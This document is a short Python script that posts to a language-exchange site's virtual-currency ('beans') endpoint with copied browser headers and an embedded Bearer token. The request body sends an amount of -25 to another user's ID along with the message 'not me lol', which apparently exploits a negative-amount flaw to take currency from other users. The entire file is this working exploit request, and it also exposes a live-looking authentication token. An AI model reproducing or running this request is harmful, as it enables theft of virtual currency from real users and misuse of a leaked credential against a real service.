import requests
headers = {
    'authority': 'elb.hilokal.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1ODI0MjciLCJ0cmFuc2NyaXB0aW9ucyI6dHJ1ZSwiaWF0IjoxNjg4MDU0MzEyfQ.qDTsrdcZgRTxHgM8RkMoGGIHrxY1_O32Tq6Q1nrFusdTOinh50r0vKJPrpeEDjQ5lN57bZ2Zfl2GLeDC1w0vaUvbaA59x7_4oJUIXffYEQjj2kvjYbOpfMRVEjesTiWcysOElnyFcTxv9kiU6kDQHFPaJcmaod6e_3basFrfQglqSneqR2C7M5wNRlLQaomxb_WphVHkqGWiXaUxCtYwOG57dm1gn3V0DMgqhteJoflQ9tu8P9ZbeRNemCoY0fEsCj5uGIoxegfP2SAh572XAs90a-lk1eAHM713ltmp7zdbtvdKbH2A_Dg_D3eBUYVtDzC3xytBnzhmzdf1mRnAXw',
    'content-type': 'application/json',
    'origin': 'https://www.hilokal.com',
    'referer': 'https://www.hilokal.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}
json_data = {
    'receiverId': 667333,
    # 'receiverId': 247406,
    'type': 'send',
    'groupCallId': 2244855,
    'anonymous': False,
    'message': 'not me lol',
    'amount': -25,
}
response = requests.post('https://elb.hilokal.com/users/beans', headers=headers, json=json_data)